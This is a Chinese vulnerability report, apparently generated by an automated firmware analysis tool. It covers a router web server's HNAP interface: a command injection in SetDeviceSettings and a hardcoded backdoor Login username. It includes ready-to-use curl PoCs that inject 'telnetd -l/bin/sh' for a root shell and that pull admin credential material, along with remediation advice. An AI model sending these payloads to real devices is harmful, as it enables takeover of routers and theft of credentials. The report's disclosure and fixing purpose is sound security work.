# 漏洞挖掘报告

> 会话 `s-mudg5kk4-3b8e` · 固件任务 `9160aafaa095` · 2026-09-23T02:13:43Z

## 一、任务信息

| 项 | 内容 |
| --- | --- |
| 任务目标 | 优先挖预认证 RCE |
| 引擎 | dsh（模式：dynamic） |
| 轮次 | 1 / 80 |

## 二、发现统计

| 危害等级 | 数量 |
| --- | --- |
| **严重** | 1 |
| **中危** | 1 |
| 合计 | 2 |

## 三、动态验证

- 摘录最近 6 条 trace，其中非空差分 0 条。

| Trace | 状态 | 入口 | 差分函数 | 备注 |
| --- | --- | --- | --- | --- |
| `e59128b000e2` | failed | `stdin` | - | QemuError: empty coverage log (target rc=1); check qemu can run the binary: qemu-mips: Error opening logfile /tmp/fwgraph-cov-e59128b000e2-base.log: No such fil |
| `fff36e037aed` | failed | `net:80` | - | QemuError: empty coverage log (target rc=1); check qemu can run the binary: qemu-mips: Error opening logfile /tmp/fwgraph-cov-fff36e037aed-base.log: No such fil |
| `fdac754d8326` | failed | `net:80` | - | QemuError: empty coverage log (target rc=1); check qemu can run the binary: qemu-mips: Error opening logfile /tmp/fwgraph-cov-fdac754d8326-base.log: No such fil |
| `ce186bd5f812` | failed | `net:80` | - | QemuError: empty coverage log (target rc=1); check qemu can run the binary: qemu-mips: Error opening logfile /tmp/fwgraph-cov-ce186bd5f812-base.log: No such fil |
| `a36c86d9208b` | failed | `stdin` | - | QemuError: empty coverage log (target rc=1); check qemu can run the binary: qemu-mips: Error opening logfile /tmp/fwgraph-cov-a36c86d9208b-base.log: No such fil |
| `2f583960149b` | failed | `net:80` | - | QemuError: empty coverage log (target rc=1); check qemu can run the binary: qemu-mips: Error opening logfile /tmp/fwgraph-cov-2f583960149b-base.log: No such fil |

## 四、漏洞详情

### 漏洞 1：HNAP/DHMAPI SetDeviceSettings 处理器命令注入（DeviceName、TZLocation 未转义拼接进 exec_cmd）（`F-mudgub44-554b`）

| 字段 | 内容 |
| --- | --- |
| 漏洞类型 | 命令注入 `CWE-78` |
| 危害等级 | **严重**（置信度 0.65） |
| 影响组件 | `firmware/binwalk_extracted/firmware.extracted/0/decrypted.bin.extracted/56CD97/squashfs-root/bin/httpd` |
| 二进制指纹 | `b18be6d07f1c97903c063686924ed3c7` |
| 漏洞位置 | `sub_470F24` @ `0x470f24` |
| 可达性 | static-only |

**漏洞描述**：httpd 的 HNAP/DHMAPI「SetDeviceSettings」动作处理器 save_CSID_SetDeviceSettings（sub_470F24，源码路径字符串 ws-hnap/SetDeviceSettings.c）把请求参数直接拼进 shell 命令行后交给 exec_cmd() 执行，未做任何转义。

两处注入：
1) DeviceName：sub_470F24 先用 sub_415DE4(a1, v26, 1024) 把 a1（结构体 +0，来自 HNAP 参数 DeviceName，经 sub_470D80 → sub_422DE4 截断到 65 字节）拷进 v26，然后执行 exec_cmd(..., "event_notifier 3001 \"U=0&Y=261&I=0&D=%s\"&\", v26)；v26 位于双引号内部，注入 '";cmd;#' 即可闭合引号执行任意命令。
2) TZLocation：sub_470D80 把 a2[5]（HNAP 参数 TZLocation）snprintf 到结构体 +172（33 字节），sub_470F24 在「有 TZLocation」分支执行 exec_cmd(..., "(fota -T %s; fota -I; fota -fQ) &", v18)；v18 位于命令首部、无引号包裹，注入 'x;cmd;#' 即可。

exec_cmd（0x4dbbe0，thunk 到 off_4ED02C，libutils 中的 (file,func,line,fmt,...) 包装）最终走 system() 语义执行，因此 DeviceName / TZLocation 两个字段的任何 shell 元字符都会以 root 身份执行。

同一模块的 SetMultipleActions_put（sub_47F030）在拼接 event_notifier 命令时对 D= 参数调用了 str_shesc() 转义，而本函数完全没有转义，属于明显的转义遗漏而非设计意图。

**漏洞证据**：

1. httpd 反编译 sub_470F24 @0x470f24：exec_cmd(v22, "ws-hnap/SetDeviceSettings.c", "save_CSID_SetDeviceSettings", 168, "event_notifier 3001 \"U=0&Y=261&I=0&D=%s\"&", v26)（v26 来自请求参数 DeviceName，无转义）
2. httpd 反编译 sub_470F24 @0x470f24：exec_cmd(v19, "ws-hnap/SetDeviceSettings.c", "save_CSID_SetDeviceSettings", 233, "(fota -T %s; fota -I; fota -fQ) &", v18)（v18 = 结构体+172，来自请求参数 TZLocation）
3. httpd 反编译 sub_470D80 @0x470d80：a2[0]=DeviceName→结构体+0（sub_422DE4 截断 0x41 字节）、a2[1]=AdminPassword→+65、a2[4]=ChangePassword 决定 +168、a2[5]=TZLocation→snprintf(+172, 33)
4. httpd 反编译 sub_4714DC @0x4714dc：解析 HNAP 参数表（name/value 对）取出 Action/DeviceName/AdminPassword/ChangePassword/TZLocation 后调用 sub_470D80(csman句柄,&v16,v15) 与 sub_470F24(v15)
5. httpd 反编译 sub_4716BC @0x4716bc：SetDeviceSettings_put 动作入口（日志字符串 "Enter %s" + "SetDeviceSettings_put"），调用 sub_4714DC(a2,0,a3-1)，失败回写 *(conn+272)=401/500
6. httpd 反编译 sub_4084AC @0x4084ac：process_method_hnap 读取 POST body（text/xml 类型 a4[3]=10）后经 uir 表项函数指针 (entry+28)(conn,body,len) 校验、(entry+24)(conn,body,size) 派发，说明 /HNAP1/ 请求进入动作处理器
7. httpd 反编译 sub_423928 @0x423928：HNAP 动作表 off_4ED9B0（步长 6 DWORD）按动作名查找，表项 +4 为鉴权标志、+8 为 put 处理器、+12 为 get 处理器
8. 对比证据：sub_47F030 @0x47f030（SetMultipleActions_put）在同样拼接 event_notifier 命令时使用 str_shesc(v73,0) 转义，而 sub_470F24 未转义；同函数内 K=%s 位置直接使用未转义的 v71

**调用链**：

```
HTTP 请求解析 sub_408A0C(0x408a0c) → 方法派发 process_method_hnap sub_4084AC(0x4084ac) → HNAP 动作表查找 sub_423928(0x423928)（off_4ED9B0） → SetDeviceSettings_put sub_4716BC(0x4716bc) → 参数解析 sub_4714DC(0x4714dc) → 结构体组装 sub_470D80(0x470d80) → save_CSID_SetDeviceSettings sub_470F24(0x470f24) → exec_cmd(0x4dbbe0) → system(0x4dbd10)
```

**漏洞 PoC**：

```
curl -sk -X POST 'http://<router-ip>/HNAP1/' -H 'Content-Type: text/xml' -H 'SOAPAction: "http://purenetworks.com/HNAP1/SetDeviceSettings"' -H 'HNAP_AUTH: <HMAC-MD5(key,timestamp+SOAPAction)> <timestamp>' --data '<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><SetDeviceSettings xmlns="http://purenetworks.com/HNAP1/"><Action>request</Action><DeviceName>a";telnetd -l/bin/sh;#</DeviceName><AdminPassword>P@ssw0rd1</AdminPassword><ChangePassword>false</ChangePassword><TZLocation>UTC;telnetd -l/bin/sh;#</TZLocation></SetDeviceSettings></soap:Body></soap:Envelope>'

DHMAPI 变体（API-ACTION/API-AUTH 头，URL /DHMAPI/）动作名同为 SetDeviceSettings，payload 相同。
设备端等价复现（已验证注入点所在函数为 root 权限执行）：sh -c 'event_notifier 3001 "U=0&Y=261&I=0&D=a";telnetd -l/bin/sh;#' 与 sh -c '(fota -T UTC;telnetd -l/bin/sh;#; fota -I; fota -fQ) &'
```

**修复建议**：1) 禁止把请求字段拼进 shell：改用 execve/posix_spawn + argv 数组调用 event_notifier/fota；必须走 shell 时对所有插值统一使用 str_shesc()（与 sub_47F030 的做法对齐），并补齐 K=%s 位置的转义。
2) 对 DeviceName/TZLocation 做白名单校验（DeviceName 限 [A-Za-z0-9_-]，TZLocation 限 /usr/share/zoneinfo 下存在的时区名）。
3) 明确 HNAP 动作表 off_4ED9B0 中 SetDeviceSettings/SetMultipleActions 等写动作的鉴权标志必须为「需要会话」，并移除 127.0.0.1/ifindex==8 的整段旁路。
4) 将 httpd 降权运行，避免命令注入直接获得 root。


### 漏洞 2：HNAP Login 预认证动作存在硬编码后门用户名 0A2326B60AB94BC（localhost 来源可泄露管理员口令材料）（`F-mudgunur-a48b`）

| 字段 | 内容 |
| --- | --- |
| 漏洞类型 | 硬编码凭据后门 `CWE-798` |
| 危害等级 | **中危**（置信度 0.6） |
| 影响组件 | `firmware/binwalk_extracted/firmware.extracted/0/decrypted.bin.extracted/56CD97/squashfs-root/bin/httpd` |
| 二进制指纹 | `b18be6d07f1c97903c063686924ed3c7` |
| 漏洞位置 | `?` @ `-` |
| 可达性 | static-only |

**漏洞描述**：httpd 的 HNAP Login 动作处理器 sub_47B918（预认证动作）在 Action=="request" 分支内保留了一段硬编码后门：当请求参数 Username 与字面量 "0A2326B60AB94BC" 匹配（strncmp 的长度取自攻击者的 strlen(Username)，因此任意前缀如 "0"、"0A" 都能命中）且来源 IP 为 127.0.0.1 时，直接跳过口令校验，从 csman 读取管理员账号/口令材料（read_csman(...,-2147466621,...)、csman 66437 公钥）并按正常登录成功路径构造响应（sub_424384 派生 Cookie/Challenge/PublicKey/PrivateKey），等价于向调用方泄露管理员凭据材料。

这是 D-Link HNAP 的典型硬编码后门（"0A2326B60AB94BC" 为固定用户名），且前缀比较写法使匹配面进一步扩大。远程利用被 127.0.0.1 判断阻断，但一旦存在令设备自请求回环地址的能力（本机 shell、任何 SSRF/URL 拉取链、或运维/云代理路径），即可在无口令情况下拿到管理员会话材料并进一步调用 SetDeviceSettings/SetMultipleActions 等写动作（与 F-mudgub44-554b 形成认证绕过→RCE 链）。

**漏洞证据**：

1. httpd 反编译 sub_47B918 @0x47b918（Action=="request" 分支）：v19 = strlen(v15); if (!strncmp(v15, "0A2326B60AB94BC", v19)) { v74[0]=2130706433; if (dword_4F0154==2130706433) { read_csman(...,-2147466621,v73,512,4); read_csman(*v21,66437,v75,17,4); goto LABEL_18; } return -401; }
2. 比较长度取自攻击者提供的 strlen(Username)，因此 "0"、"0A"、"0A2326" 等任意前缀都能通过该硬编码用户名校验（strncmp 按短串长度比较）
3. dword_4F0154 的来源：sub_47C1C0 @0x47c1c0 中 dword_4F0154 = *(a1+48)；sub_408A0C @0x408a0c 中 conn+48 = v3[2]（accept 时写入的 socket 对端地址），sub_42131C @0x42131c 用 a1[12]==0x7F000001 && a1[8]==8 判断 loopback，说明该字段是真实客户端 IP，不可由请求头伪造
4. LABEL_18 之后的 sub_424384(username, 口令, cookie, challenge, publickey, privatekey, ...) 会用读取到的口令派生会话私钥并以响应返回，等价于向调用方泄露管理员口令材料
5. 该分支是 Login 动作（预认证动作，HNAP 动作表 off_4ED9B0 中 Login 无需会话），无需任何凭据即可到达硬编码用户名比较

**调用链**：

```
HNAP Login 动作包装 sub_47C1C0(0x47c1c0) → 登录处理 sub_47B918(0x47b918) → 硬编码用户名比较 strncmp(Username,"0A2326B60AB94BC",strlen(Username)) → 客户端 IP 判断 dword_4F0154==0x7F000001 → read_csman/read_csman_int(65538、66437、-2147466621) → 随 Login 响应返回管理员用户名/口令哈希与公钥
```

**漏洞 PoC**：

```
在设备本机（或任何能令设备自我请求 127.0.0.1 的场景，如存在 SSRF 的 URL 拉取功能）执行：
curl -s -X POST http://127.0.0.1/HNAP1/ -H 'Content-Type: text/xml' -H 'SOAPAction: "http://purenetworks.com/HNAP1/Login"' --data '<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><Login xmlns="http://purenetworks.com/HNAP1/"><Action>request</Action><Username>0A2326B60AB94BC</Username><LoginPassword>x</LoginPassword></Login></soap:Body></soap:Envelope>'
（Username 用任意前缀如 "0" 亦可命中）
```

**修复建议**：删除 HNAP Login 处理器中针对用户名 "0A2326B60AB94BC" 的整段特判分支（以及 sub_470F24 中 "24601"/"Medeleine" 之类调试/产线后门逻辑）；管理员口令与公钥不得在未鉴权响应中返回；如确需本机自动登录，应改用只读的一次性令牌并校验来源进程/接口，而不是依赖可被绕过的 127.0.0.1 判断。

